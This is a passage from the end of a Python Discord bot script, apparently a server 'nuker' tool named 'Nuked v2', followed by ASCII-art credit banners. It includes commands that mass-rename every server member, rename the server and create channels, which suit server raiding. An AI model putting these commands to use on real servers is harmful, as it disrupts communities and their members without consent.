    embed = discord.Embed(description=f"{client.user.mention} spanks {member.mention}", color=0xfd53d0)
    embed.set_image(url=r['url'])
    await ctx.send(embed=embed, delete_after=20)

@client.command()
async def setnicks(ctx, *, message):
    await ctx.message.delete()
    for member in ctx.message.guild.members:
        await member.edit(nick=message)

@client.command()
async def revertnicks(ctx):
    await ctx.message.delete()
    for member in ctx.message.guild.members:
        await member.edit(nick=None)

@client.command()
async def guildname(ctx, *, message):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.edit(name=message)

@client.command()
async def channel(ctx, *, message):
    await ctx.message.delete()
    await ctx.guild.create_text_channel(name=message)


@client.command()
async def encode(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(base64.b64encode(bytes(message, 'utf-8')).decode(), delete_after=15)

@client.command()
async def decode(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(base64.b64decode(bytes(message, 'utf-8')).decode(), delete_after=15)


if __name__ == '__main__':
    Init()
else:
    clear()
    try:
        ctypes.windll.kernel32.SetConsoleTitleW('wow')
    except:
        pass
    print('why you tryna skid rip nuked?')
    input('all credits go to kylie#0010')


"""


kkkkkkkk                                   lllllll   iiii                                                  1111111    333333333333333    333333333333333   77777777777777777777
k::::::k                                   l:::::l  i::::i                          ######    ######      1::::::1   3:::::::::::::::33 3:::::::::::::::33 7::::::::::::::::::7
k::::::k                                   l:::::l   iiii                           #::::#    #::::#     1:::::::1   3::::::33333::::::33::::::33333::::::37::::::::::::::::::7
k::::::k                                   l:::::l                                  #::::#    #::::#     111:::::1   3333333     3:::::33333333     3:::::3777777777777:::::::7
 k:::::k    kkkkkkkyyyyyyy           yyyyyyyl::::l iiiiiii     eeeeeeeeeeee    ######::::######::::######   1::::1               3:::::3            3:::::3           7::::::7
 k:::::k   k:::::k  y:::::y         y:::::y l::::l i:::::i   ee::::::::::::ee  #::::::::::::::::::::::::#   1::::1               3:::::3            3:::::3          7::::::7
 k:::::k  k:::::k    y:::::y       y:::::y  l::::l  i::::i  e::::::eeeee:::::ee######::::######::::######   1::::1       33333333:::::3     33333333:::::3          7::::::7
 k:::::k k:::::k      y:::::y     y:::::y   l::::l  i::::i e::::::e     e:::::e     #::::#    #::::#        1::::l       3:::::::::::3      3:::::::::::3          7::::::7
 k::::::k:::::k        y:::::y   y:::::y    l::::l  i::::i e:::::::eeeee::::::e     #::::#    #::::#        1::::l       33333333:::::3     33333333:::::3        7::::::7
 k:::::::::::k          y:::::y y:::::y     l::::l  i::::i e:::::::::::::::::e ######::::######::::######   1::::l               3:::::3            3:::::3      7::::::7
 k:::::::::::k           y:::::y:::::y      l::::l  i::::i e::::::eeeeeeeeeee  #::::::::::::::::::::::::#   1::::l               3:::::3            3:::::3     7::::::7
 k::::::k:::::k           y:::::::::y       l::::l  i::::i e:::::::e           ######::::######::::######   1::::l               3:::::3            3:::::3    7::::::7
k::::::k k:::::k           y:::::::y       l::::::li::::::ie::::::::e               #::::#    #::::#     111::::::1113333333     3:::::33333333     3:::::3   7::::::7
k::::::k  k:::::k           y:::::y        l::::::li::::::i e::::::::eeeeeeee       #::::#    #::::#     1::::::::::13::::::33333::::::33::::::33333::::::3  7::::::7
k::::::k   k:::::k         y:::::y         l::::::li::::::i  ee:::::::::::::e       ######    ######     1::::::::::13:::::::::::::::33 3:::::::::::::::33  7::::::7
kkkkkkkk    kkkkkkk       y:::::y          lllllllliiiiiiii    eeeeeeeeeeeeee                            111111111111 333333333333333    333333333333333   77777777
                         y:::::y
                        y:::::y
                       y:::::y
                      y:::::y
                     yyyyyyy




   SSSSSSSSSSSSSSS      tttt                                                                                               000000000          000000000          000000000       1111111
 SS:::::::::::::::S  ttt:::t                                                                     ######    ######        00:::::::::00      00:::::::::00      00:::::::::00    1::::::1
S:::::SSSSSS::::::S  t:::::t                                                                     #::::#    #::::#      00:::::::::::::00  00:::::::::::::00  00:::::::::::::00 1:::::::1
S:::::S     SSSSSSS  t:::::t                                                                     #::::#    #::::#     0:::::::000:::::::00:::::::000:::::::00:::::::000:::::::0111:::::1
S:::::S        ttttttt:::::ttttttt   rrrrr   rrrrrrrrr   aaaaaaaaaaaaa  ppppp   ppppppppp   ######::::######::::######0::::::0   0::::::00::::::0   0::::::00::::::0   0::::::0   1::::1
S:::::S        t:::::::::::::::::t   r::::rrr:::::::::r  a::::::::::::a p::::ppp:::::::::p  #::::::::::::::::::::::::#0:::::0     0:::::00:::::0     0:::::00:::::0     0:::::0   1::::1
 S::::SSSS     t:::::::::::::::::t   r:::::::::::::::::r aaaaaaaaa:::::ap:::::::::::::::::p ######::::######::::######0:::::0     0:::::00:::::0     0:::::00:::::0     0:::::0   1::::1
  SS::::::SSSSStttttt:::::::tttttt   rr::::::rrrrr::::::r         a::::app::::::ppppp::::::p     #::::#    #::::#     0:::::0 000 0:::::00:::::0 000 0:::::00:::::0 000 0:::::0   1::::l
    SSS::::::::SS    t:::::t          r:::::r     r:::::r  aaaaaaa:::::a p:::::p     p:::::p     #::::#    #::::#     0:::::0 000 0:::::00:::::0 000 0:::::00:::::0 000 0:::::0   1::::l
       SSSSSS::::S   t:::::t          r:::::r     rrrrrrraa::::::::::::a p:::::p     p:::::p######::::######::::######0:::::0     0:::::00:::::0     0:::::00:::::0     0:::::0   1::::l
            S:::::S  t:::::t          r:::::r           a::::aaaa::::::a p:::::p     p:::::p#::::::::::::::::::::::::#0:::::0     0:::::00:::::0     0:::::00:::::0     0:::::0   1::::l
            S:::::S  t:::::t    ttttttr:::::r          a::::a    a:::::a p:::::p    p::::::p######::::######::::######0::::::0   0::::::00::::::0   0::::::00::::::0   0::::::0   1::::l
SSSSSSS     S:::::S  t::::::tttt:::::tr:::::r          a::::a    a:::::a p:::::ppppp:::::::p     #::::#    #::::#     0:::::::000:::::::00:::::::000:::::::00:::::::000:::::::0111::::::111
S::::::SSSSSS:::::S  tt::::::::::::::tr:::::r          a:::::aaaa::::::a p::::::::::::::::p      #::::#    #::::#      00:::::::::::::00  00:::::::::::::00  00:::::::::::::00 1::::::::::1
S:::::::::::::::SS     tt:::::::::::ttr:::::r           a::::::::::aa:::ap::::::::::::::pp       ######    ######        00:::::::::00      00:::::::::00      00::    :::::::00   1::::::::::1
 SSSSSSSSSSSSSSS         ttttttttttt  rrrrrrr            aaaaaaaaaa  aaaap::::::pppppppp                                   000000000          000000000          000000000     111111111111
                                                                         p:::::p
                                                                         p:::::p
                                                                        p:::::::p
                                                                        p:::::::p
                                                                        p:::::::p
                                                                        ppppppppp

"""


# Nuked v2 by kylie#1337
